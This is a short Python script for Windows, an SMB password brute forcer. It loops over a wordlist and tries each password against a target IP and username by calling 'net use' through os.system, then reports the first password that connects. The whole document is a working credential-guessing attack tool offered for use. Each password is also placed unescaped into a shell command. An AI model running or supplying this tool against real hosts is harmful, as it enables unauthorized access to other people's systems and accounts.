import os
import time
import argparse
count = 0
os.system('color 04')
def cls():
    os.system('cls')
def banner():
    cls()
    print("=" * 50)
    print("          Password SMB Brute Forcer")
    print("=" * 50)
    print("loading...")
def main():
    global count
    banner()
    time.sleep(2)
    parser = argparse.ArgumentParser(description="SMB Brute Force Password")
    parser.add_argument('ip', type=str, help='IP Address of the target (e.g., 192.168.1.100)')
    parser.add_argument('username', type=str, help='Username for authentication (e.g., admin)')
    parser.add_argument('wordlist', type=str, help='Path to the password list file (e.g., passwords.txt)')
    args = parser.parse_args()
    ip = args.ip
    user = args.username
    wordlist = args.wordlist
    try:
        with open(wordlist, 'r', encoding='utf-8') as file:
            passwords = file.readlines()
        passwords = [password.strip() for password in passwords]
    except Exception as e:
        print("[Error]:", e)
        return 
    cls()
    print("\n" + "=" * 50)
    print("          Attempting to connect...")
    print("=" * 50)
    for password in passwords:
        password = password.strip()
        result = os.system(f'net use \\\\{ip} /user:{user} "{password}" >nul 2>&1')
        count += 1
        if result == 0:
            cls()
            print("\n" + "=" * 50)
            print(f"\n[+] Success! Connected with password: {password}")
            print('[+] Attempt:', count)
            print("[+] Finished attempting passwords.")
            print("\n" + "=" * 50)
            exit(0)
        else:
            print(f"[-] Failed to connect with password: {password}")
    cls()
    print("[-] Password not Found :(")
    
    
if __name__ == "__main__":
    main()
